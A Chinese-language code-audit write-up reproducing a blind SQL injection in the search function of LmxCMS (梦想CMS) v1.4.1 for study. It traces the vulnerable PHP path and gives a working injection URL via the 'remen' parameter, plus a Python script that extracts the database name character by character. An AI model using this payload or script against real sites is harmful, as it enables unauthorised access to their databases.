# 梦想CMS 前台搜索SQL注入

- [梦想CMS 前台搜索SQL注入](#梦想cms-前台搜索sql注入)
  - [漏洞要求](#漏洞要求)
  - [漏洞分析](#漏洞分析)
  - [漏洞测试](#漏洞测试)
  - [小结](#小结)
  - [相关链接](#相关链接)

v1.4.1版本的源码放在当前目录下，防止后面的漏洞找不到源代码

## 漏洞要求

- 版本：v1.4.1

## 漏洞分析

这篇文章是根据 <https://xz.aliyun.com/t/11224> 这个师傅的文章进行的漏洞复现，所以直接看漏洞点，这个搜索框的SQL注入点还是挺有意思的，在学习完SQl注入之后，可以通过这个漏洞点进行很好的学习。

这个漏洞是在首页的搜索框，之前也确实没有关注过这个地方可能会存在漏洞。

关于搜索的接口对应的代码文件为 `c/index/SearchAction.class.php` 内容如下：

```php
class SearchAction extends HomeAction{
    private $searchModel = null;
    private $param;
    public function __construct(){
        parent::__construct();
        if(!$this->config['is_search']) rewrite::error($this->l['search_is_on']);
        $this->searchTime(); //验证搜索时间间隔
        $this->check(); //验证接收数据
        if($this->searchModel == null) $this->searchModel = new SearchModel();
    }

    public function index(){
        $this->param['ischild'] = 1;
        $arr = $this->searchModel->getSerachField($this->param);//初始化条件
        $count = $this->searchModel->searchCoutn($arr);
        if($count > 0){
            $page = new page($count,$GLOBALS['public']['searchnum']);
            //获取列表数据
            $arr['page'] = $page->returnLimit();
            $arr['is_home'] = 1;
            $searchData = $this->searchModel->getSearchList($arr,$this->param);
            //赋值url和其他变量
            foreach($searchData as $v){
                $param['type'] = 'content';
                $param['classid'] = $v['classid'];
                $param['classpath'] = $GLOBALS['allclass'][$v['classid']]['classpath'];
                $param['time'] = $v['time'];
                $param['id'] = $v['id'];
                $v['classname'] = $GLOBALS['allclass'][$v['classid']]['classname'];
                $v['url'] = $v['url'] ? $v['url'] : url($param);
                $v['classurl'] = classurl($v['classid']);
                $v['classimage'] = $GLOBALS['allclass'][$v['classid']]['images'];
                $v['parent_classid'] = $GLOBALS['allclass'][$v['classid']]['uid'];
                $newlist[] = $v;
            }
            $this->smarty->assign('list',$newlist);
            $this->smarty->assign('page',$page->html());
        }
        $this->smarty->assign('num',$count);
        //获取搜索列表模板
        if(!$this->param['tem']){
            if($this->param['classid']){
                $classtem = $GLOBALS['allclass'][$arr['classid']]['searchtem'];
                $arr['tem'] = $classtem ? $classtem : 'index';
            }else{
                $arr['tem'] = 'index';
            }
        }else{
            $arr['tem'] = $this->param['tem'];
        }
        $this->setSearchTime(); //保存搜索时间
        $this->smarty->assign('title',$this->param['keywords']);
        $this->smarty->assign('keywords',$this->param['keywords']);
        $this->smarty->assign('description',$this->param['keywords']);
        $this->smarty->display('search/'.$arr['tem'].'.html');
    }


    //验证接收数据并返回
    private function check(){
        //获取get数据
        $_GET = filter_strs($_GET);
        $data = p(2,1,1);
        $this->param['keywords'] = string::delHtml($data['keywords']);
        if(!$this->param['keywords'] && $this->config['search_isnull']){
            rewrite::error($this->l['search_is_keywords']);
        }
        $this->param['classid'] = (int)$data['classid'];
        $this->param['mid'] = (int)$data['mid'];
        if(!$this->param['classid'] && !$this->param['mid']) rewrite::error($this->l['search_is_param']);
        if($this->param['classid'] && !isset($GLOBALS['allclass'][$this->param['classid']])){
            rewrite::error($this->l['search_is_classid']);
        }
        if($this->param['mid'] && !isset($GLOBALS['allmodule'][$this->param['mid']])){
            rewrite::error($this->l['search_is_mid']);
        }
        $this->param['tem'] = $data['tem'];
        $this->param['field'] = $data['field'];
        $this->param['time'] = $data['time'] ? $data['time'] : $this->config['search_time'];
        $this->param['tuijian'] = $data['tuijian'];
        $this->param['remen'] = $data['remen'];
    }

}
```

从上面的代码可以看到 在初始化构造的时候就会先调用 `$this->check();` 验证接收数据，跟踪这个函数可以看到到`check` 方法中校验参数必须有`keywords`,同时会调用 `string::delHtml($data['keywords']);` 对`keywords`做处理，跟踪 `delHtml` 到 `class/string.class.php` 文件的如下代码：

```php
//去掉html标签
public static function delHtml($str){
    return strip_tags($str);
}
```

主要用于去除html 标签。
返回到index 继续追踪代码，可以看到代码会执行 `$count = $this->searchModel->searchCoutn($arr);` ,追踪到`m/SearchModel.class.php` 文件中的 `searchCoutn` 方法

```php
//获取搜索总条数
public function searchCoutn($searchInfo){
    $param = $this->sqlStr($searchInfo);
    $param['force'] = 'title';
    return parent::countModel($param);
}
```

继续追踪 到 `class/Model.class.php` 文件中的 `countModel`方法

```php
//返回记录数
protected function countModel($param=array()){
    return parent::countDB($this->tab['0'],$param);
}
```

最终追踪到`class/db.class.php` 文件的 `countDB` 方法

```php
//查询记录数
protected function countDB($tab,$param){
    $We = $this->where($param);
    $sql="SELECT count(1) FROM ".DB_PRE."$tab $We";
    // echo $sql;
    $result=$this->query($sql);
    $data = mysql_fetch_row($result);
    $this->result($result);
    return $data['0'];
}
```

为了方便可以在上面的方法中添加 `echo $sql;` 进行调试，方便进行打印当前执行的SQL

上面是我们整体对漏洞代码的追溯过程，我们重新回头看最开始的代码文件 `c/index/SearchAction.class.php`中的`check` 方法

```php
//验证接收数据并返回
private function check(){
    //获取get数据
    $_GET = filter_strs($_GET);
    $data = p(2,1,1);
    $this->param['keywords'] = string::delHtml($data['keywords']);
    if(!$this->param['keywords'] && $this->config['search_isnull']){
        rewrite::error($this->l['search_is_keywords']);
    }
    $this->param['classid'] = (int)$data['classid'];
    $this->param['mid'] = (int)$data['mid'];
    if(!$this->param['classid'] && !$this->param['mid']) rewrite::error($this->l['search_is_param']);
    if($this->param['classid'] && !isset($GLOBALS['allclass'][$this->param['classid']])){
        rewrite::error($this->l['search_is_classid']);
    }
    if($this->param['mid'] && !isset($GLOBALS['allmodule'][$this->param['mid']])){
        rewrite::error($this->l['search_is_mid']);
    }
    $this->param['tem'] = $data['tem'];
    $this->param['field'] = $data['field'];
    $this->param['time'] = $data['time'] ? $data['time'] : $this->config['search_time'];
    $this->param['tuijian'] = $data['tuijian'];
    $this->param['remen'] = $data['remen'];
}
```

这里需要注意的是 `$data = p(2,1,1);` 这个地方会对我们输入的参数进行转义单引号，过滤了部分函数。

这个方法其实还告诉了一个我们比较有用的信息

```php
$this->param['tem'] = $data['tem'];
$this->param['field'] = $data['field'];
$this->param['time'] = $data['time'] ? $data['time'] : $this->config['search_time'];
$this->param['tuijian'] = $data['tuijian'];
$this->param['remen'] = $data['remen'];
```

这个几个是都可以作为参数做传递的,下面我通过`remen`进行测试

## 漏洞测试

发送如下请求：`/index.php?m=Search&a=index&classid=5&tem=index&field=title&keywords=c&remen=11` 看打印的SQL 为：

```sql
SELECT count(1) FROM lmx_product_data  WHERE time > 1626240056 AND remen=11 AND classid in(11,12,13,14,5)  AND (title like '%c%')  ORDER BY id desc
```

可以看到我们传递的 `remen` 已经被拼接到SQL 中，剩下的就是进行注入测试。

发送请求 `/index.php?m=Search&a=index&classid=5&tem=index&field=title&keywords=c&remen=2%20or%20(if(ascii(substr(database(),1,1))=0x6c,1,0))--+`
因为单引号会被转义，所以这里使用的是`ascii`, 我们测试设置的数据库的名字是 `lmxcms`, 第一位是 l 对应的 就是 `0x6c`, 这个时候页面返回的 `Content-Length: 7722` 如果我们的值不是  `0x6c` 返回的长度为 `Content-Length: 4955`

所以可以基于这个写代码来获取数据库信息

```python
import requests

url = "http://192.168.80.154:9090?m=search&keywords=b&mid=1&remen=1 or (if(ascii(substr(database(),{},1))={},1,0))--+"
result = ""

for i in range(1, 7):
    for j in range(80, 180):
        cl = url.format(i, hex(j))
        res = requests.get(cl)
        if len(res.text) > 6000:
            result += chr(j)
            print(result)
```

## 小结

这个漏洞是一个非常好的代码审计的下例子，代码也不复杂，即使不懂 `PHP` 的也可以快速入门

## 相关链接

- <https://xz.aliyun.com/t/11224>
- <http://www.lmxcms.com/down/xitong/20210530/14.html>
